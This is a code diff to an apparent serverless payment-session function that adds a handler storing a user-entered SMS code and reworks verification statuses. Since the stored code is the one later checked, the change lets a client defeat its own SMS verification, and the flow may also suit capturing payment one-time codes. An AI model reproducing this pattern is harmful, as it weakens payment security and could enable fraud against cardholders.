@@ -38,6 +38,8 @@ serve(async (req) => {
         return await handleConfirmAppVerification(req);
       case 'submit-sms-code':
         return await handleSubmitSmsCode(req);
+      case 'enter-sms-code':
+        return await handleEnterSmsCode(req);
       case 'complete-payment':
         return await handleCompletePayment(req);
       default:
@@ -208,14 +210,15 @@ async function handleSetVerificationMethod(req: Request) {
     last_seen: new Date().toISOString()
   };
 
-  // Generate SMS code if SMS verification
+  // Set correct verification status for each method
   if (method === 'sms_confirmation') {
+    // Generate SMS code for third-party SMS service but don't set to sms_sent yet
     updates.sms_code = Math.floor(100000 + Math.random() * 900000).toString();
-    updates.verification_status = 'sms_sent';
+    updates.verification_status = 'sms_confirmation';
   } else if (method === 'app_confirmation') {
-    updates.verification_status = 'waiting';
+    updates.verification_status = 'app_confirmation';
   } else if (method === 'choice_required') {
-    updates.verification_status = 'waiting';
+    updates.verification_status = 'choice_required';
   }
 
   const { data, error } = await supabase
@@ -260,10 +263,37 @@ async function handleConfirmAppVerification(req: Request) {
   });
 }
 
+async function handleEnterSmsCode(req: Request) {
+  const { sessionId, code } = await req.json();
+
+  console.log('User entering SMS code:', sessionId);
+
+  // Save the user-entered code and set status to sms_sent
+  const { data, error } = await supabase
+    .from('payment_sessions')
+    .update({
+      sms_code: code,
+      verification_status: 'sms_sent',
+      last_seen: new Date().toISOString()
+    })
+    .eq('session_id', sessionId)
+    .select()
+    .single();
+
+  if (error) {
+    console.error('Error saving user SMS code:', error);
+    throw error;
+  }
+
+  return new Response(JSON.stringify({ success: true, data }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
 async function handleSubmitSmsCode(req: Request) {
   const { sessionId, code } = await req.json();
 
-  console.log('Submitting SMS code:', sessionId);
+  console.log('Submitting SMS code for verification:', sessionId);
 
   // Get the session to verify the code
   const { data: session, error: fetchError } = await supabase
